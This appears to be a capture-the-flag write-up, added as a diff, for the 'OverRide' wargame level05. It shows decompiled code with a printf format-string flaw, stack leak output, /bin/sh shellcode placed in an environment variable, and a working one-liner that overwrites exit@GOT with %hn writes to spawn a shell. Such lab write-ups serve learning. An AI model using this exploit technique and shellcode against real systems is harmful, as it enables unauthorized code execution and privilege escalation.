@@ -1,0 +1,71 @@
+int32_t main(int32_t argc, char** argv, char** envp)
+{
+    int32_t var_14 = 0;
+    char var_78[100];
+    fgets(&var_78, 100, __bss_start);
+    int32_t var_14_1 = 0;
+    
+    while (true)
+    {
+        int32_t i = 4294967295;
+        char (* edi_1)[100] = &var_78;
+        
+        while (i)
+        {
+            bool cond:0_1 = 0 != *edi_1;
+            edi_1 = &(*edi_1)[1];
+            i -= 1;
+            
+            if (!cond:0_1)
+                break;
+        }
+        
+        if (var_14_1 >= ~i - 1)
+            break;
+        
+        if (var_78[var_14_1] > 64 && var_78[var_14_1] <= 90)
+            var_78[var_14_1] ^= 32;
+        
+        var_14_1 += 1;
+    }
+    
+    printf(&var_78);
+    exit(0);
+    /* no return */
+}
+
+
+
+level05@OverRide:~$ objdump -R level05  | grep exit
+080497e0 R_386_JUMP_SLOT   exit
+
+\xe0\x97\x04\x08\
+
+level05@OverRide:~$ ./level05 
+%p %p %p %p %p %p %p%p %p %p %p %p %p %p%p %p %p %p %p %p %p%p %p %p %p %p %p %p%p %p %p %p %p %p %p%p %p %p %p %p %p %p%p %p %p %p %p %p %p
+0x64 0xf7fcfac0 0xf7ec3add 0xffffd5ff 0xffffd5fe (nil) 0xffffffff 0xffffd684 0xf7fdb000 0x25207025 0x70252070 0x20702520 0x25207025 0x702520700x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x25207025 0x702520700x20702520 0x25207025 0x70252070 0x25207025 0x70252070 0x20702520 0x252070250x70252070 0x25207025 0x70252070 0x20702520 0x25207025 0x252070
+
+offset 10: 0xffffd5f4
+offset 11: 0xffffd5f8
+
+
+export shellcode=$(python2 -c 'print "\x90"*200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+
+(gdb) x/s *(environ+48)
+0xffffde36:      "shellcode=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+
+0xffffde36 = 4 294 958 646
+
+split payload into two parts print 60000 ~ than 4 billion
+
+target: exit@GOT = 0x080497e0; write the sled address 0xffffdea4 there
+    -> split into two parts: 0xdea4 (lower half) and 0xffff (upper half)
+
+1 - \xe0\x97\x04\x08 (=0x080497e0): the counter must equal 0xdea4 = 57012
+        8 bytes have already been printed -> %57004c (8 + 57004 = 57012) -> %10$hn writes 0xdea4
+
+2 - \xe2\x97\x04\x08 (=0x080497e2): the counter must equal 0xffff = 65535
+        already at 57012 -> %8523c (57012 + 8523 = 65535) -> %11$hn writes 0xffff
+
+
+(python2 -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%57004c%10$hn%8523c%11$hn"'; cat) | ./level05
